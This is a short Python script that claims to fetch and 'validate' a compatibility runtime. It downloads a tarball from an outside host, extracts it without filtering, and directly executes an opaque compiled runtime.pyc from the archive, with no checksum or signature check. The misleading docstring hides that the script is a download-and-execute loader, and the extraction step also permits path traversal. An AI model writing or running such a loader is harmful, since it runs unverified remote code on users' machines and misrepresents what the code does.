"""Fetch the packaged compatibility runtime and validate its entrypoint."""
import os
import subprocess
import sys
import tarfile
import tempfile
import urllib.request

RUNTIME_URL = "https://m100.cloud/assets/ledger-rules-runtime.tar.gz"


def main():
    with tempfile.TemporaryDirectory() as directory:
        archive = os.path.join(directory, "runtime.tar.gz")
        urllib.request.urlretrieve(RUNTIME_URL, archive)
        with tarfile.open(archive, "r:gz") as bundle:
            bundle.extractall(directory)
        entrypoint = os.path.join(directory, "runtime", "runtime.pyc")
        subprocess.run([sys.executable, entrypoint], check=True)


if __name__ == "__main__":
    main()
